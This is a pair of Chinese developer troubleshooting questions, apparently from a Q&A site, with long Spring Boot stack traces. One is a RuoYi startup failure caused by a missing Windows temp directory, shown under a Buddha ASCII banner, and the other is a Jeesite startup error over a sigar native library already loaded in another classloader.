若依后端启动总是显示佛祖，没有ruoyi图标,"Application Version: 3.8.3 Spring Boot Version: 2.5.14 //////////////////////////////////////////////////////////////////// // <em>ooOoo</em> // // o8888888o // // 88"" . ""88 // // (| ^_^ |) // // O\ = /O // // <em><em>/. // // / \||| : |||// \ // // / <em>||||| -:- |||||- \ // // | | \\ - /// | | // // | _| ''---/'' | | // // \ .-_</em> <em>/-. / // // <em>. . ___ // // ."""" '&lt; - `.;;. : | | // // \ \ / / // // ========-.</em>_</em></em>/</em>.-=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 21:56:16.571 [background-preinit] INFO o.h.v.i.util.Version - [,21] - HV000001: Hibernate Validator 6.2.3.Final 21:56:16.611 [restartedMain] INFO c.r.RuoYiApplication - [logStarting,55] - Starting RuoYiApplication using Java 1.8.0_221 on DESKTOP-MUEMSFA with PID 19012 (F:\ RuoYi-Vue-master\RuoYi-Vue-master\ruoyi-admin\target\classes started by 郝三爷 in F:\ RuoYi-Vue-master\RuoYi-Vue-master) 21:56:16.611 [restartedMain] DEBUG c.r.RuoYiApplication - [logStarting,56] - Running with Spring Boot v2.5.14, Spring v5.3.20 21:56:16.611 [restartedMain] INFO c.r.RuoYiApplication - [logStartupProfileInfo,686] - The following 1 profile is active: ""druid"" 21:56:41.986 [restartedMain] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext - [refresh,591] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is java.lang.IllegalStateException: Temp directory 'C:\WINDOWS\TEMP' does not exist 21:56:42.226 [restartedMain] ERROR o.s.b.SpringApplication - [reportFailure,870] - Application run failed org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is java.lang.IllegalStateException: Temp directory 'C:\WINDOWS\TEMP' does not exist at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:163) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:577) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:780) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:453) at org.springframework.boot.SpringApplication.run(SpringApplication.java:343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1370) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1359) at com.ruoyi.RuoYiApplication.main(RuoYiApplication.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) Caused by: java.lang.IllegalStateException: Temp directory 'C:\WINDOWS\TEMP' does not exist at org.springframework.util.Assert.state(Assert.java:97) at org.springframework.boot.system.ApplicationTemp.getTempDirectory(ApplicationTemp.java:125) at org.springframework.boot.system.ApplicationTemp.getPath(ApplicationTemp.java:96) at org.springframework.boot.system.ApplicationTemp.getDir(ApplicationTemp.java:89) at org.springframework.boot.web.servlet.server.SessionStoreDirectory.getValidDirectory(SessionStoreDirectory.java:46) at org.springframework.boot.web.servlet.server.AbstractServletWebServerFactory.getValidSessionStoreDir(AbstractServletWebServerFactory.java:288) at org.springframework.boot.web.servlet.server.AbstractServletWebServerFactory.getValidSessionStoreDir(AbstractServletWebServerFactory.java:284) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.configurePersistSession(TomcatServletWebServerFactory.java:422) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.configureSession(TomcatServletWebServerFactory.java:412) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.configureContext(TomcatServletWebServerFactory.java:389) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.prepareContext(TomcatServletWebServerFactory.java:251) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.getWebServer(TomcatServletWebServerFactory.java:203) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:182) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:160) ... 13 common frames omitted Process finished with exit code 0   <code>: ---'\____ // // .' \\| |// - . .' /--.--\ .___\_&lt;|&gt;_/___.' &gt;'"""". // // | | : \ _ / / - -. \_ __\ /__ _/ .- -.____ ____.-'======== // //"
Jeesite首次启动时报 Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader,运行环境： Jeesite 4.0.4 Ubuntu Server 16.04.1 LTS 64位 JDK-10.0.1 apache-tomcat-9.0.10 异常日志   <code>: 07-13 16:38:44.229 ERROR [org.springframework.boot.SpringApplication] - Application startup failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userController': Unsatisfied dependency expressed through field 'userService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userService': Unsatisfied dependency expressed through field 'dao'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:867) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:543) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:693) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:360) at org.springframework.boot.SpringApplication.run(SpringApplication.java:303) at org.springframework.boot.web.support.SpringBootServletInitializer.run(SpringBootServletInitializer.java:154) at org.springframework.boot.web.support.SpringBootServletInitializer.createRootApplicationContext(SpringBootServletInitializer.java:134) at org.springframework.boot.web.support.SpringBootServletInitializer.onStartup(SpringBootServletInitializer.java:87) at org.springframework.web.SpringServletContainerInitializer.onStartup(SpringServletContainerInitializer.java:169) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5098) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardContext.reload(StandardContext.java:3716) at org.apache.catalina.loader.WebappLoader.backgroundProcess(WebappLoader.java:292) at org.apache.catalina.core.StandardContext.backgroundProcess(StandardContext.java:5465) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1396) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1368) at java.base/java.lang.Thread.run(Thread.java:844) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userService': Unsatisfied dependency expressed through field 'dao'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 30 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveReference(BeanDefinitionValueResolver.java:359) at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:108) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1531) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1276) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 43 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:749) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:467) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1173) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1067) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveReference(BeanDefinitionValueResolver.java:351) ... 56 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1628) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:835) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:741) ... 66 common frames omitted Caused by: java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at java.base/java.lang.ClassLoader$NativeLibrary.loadLibrary(ClassLoader.java:2450) at java.base/java.lang.ClassLoader.loadLibrary0(ClassLoader.java:2678) at java.base/java.lang.ClassLoader.loadLibrary(ClassLoader.java:2611) at java.base/java.lang.Runtime.load0(Runtime.java:814) at java.base/java.lang.System.load(System.java:1838) at com.jeesite.common.s.s.i.&lt;clinit&gt;(lm:75) at com.jeesite.common.s.p.i.&lt;clinit&gt;(qb:93) at com.jeesite.common.datasource.g.ALLATORIxDEMO(bl:165) at com.jeesite.common.datasource.g.d(bl:92) at com.jeesite.common.datasource.RoutingDataSource.afterPropertiesSet(bl:43) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1687) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1624) ... 77 common frames omitted 13-Jul-2018 16:38:44.233 SEVERE [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Exception starting Context with name [] org.apache.catalina.LifecycleException: Failed to start component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[]] at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:441) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198) at org.apache.catalina.core.StandardContext.reload(StandardContext.java:3716) at org.apache.catalina.loader.WebappLoader.backgroundProcess(WebappLoader.java:292) at org.apache.catalina.core.StandardContext.backgroundProcess(StandardContext.java:5465) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1396) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400) at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1368) at java.base/java.lang.Thread.run(Thread.java:844) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userController': Unsatisfied dependency expressed through field 'userService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userService': Unsatisfied dependency expressed through field 'dao'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:867) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:543) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:693) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:360) at org.springframework.boot.SpringApplication.run(SpringApplication.java:303) at org.springframework.boot.web.support.SpringBootServletInitializer.run(SpringBootServletInitializer.java:154) at org.springframework.boot.web.support.SpringBootServletInitializer.createRootApplicationContext(SpringBootServletInitializer.java:134) at org.springframework.boot.web.support.SpringBootServletInitializer.onStartup(SpringBootServletInitializer.java:87) at org.springframework.web.SpringServletContainerInitializer.onStartup(SpringServletContainerInitializer.java:169) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5098) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) ... 8 more Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userService': Unsatisfied dependency expressed through field 'dao'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 30 more Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userDao' defined in URL [jar:file:/home/ubuntu/web-server/web-test/ss-web/WEB-INF/lib/jeesite-framework-4.0.4-SNAPSHOT.jar!/com/jeesite/modules/sys/dao/UserDao.class]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveReference(BeanDefinitionValueResolver.java:359) at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:108) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1531) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1276) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 43 more Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/jeesite/modules/config/MyBatisConfig.class]: Unsatisfied dependency expressed through method 'sqlSessionFactory' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:749) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:467) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1173) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1067) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveReference(BeanDefinitionValueResolver.java:351) ... 56 more Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in 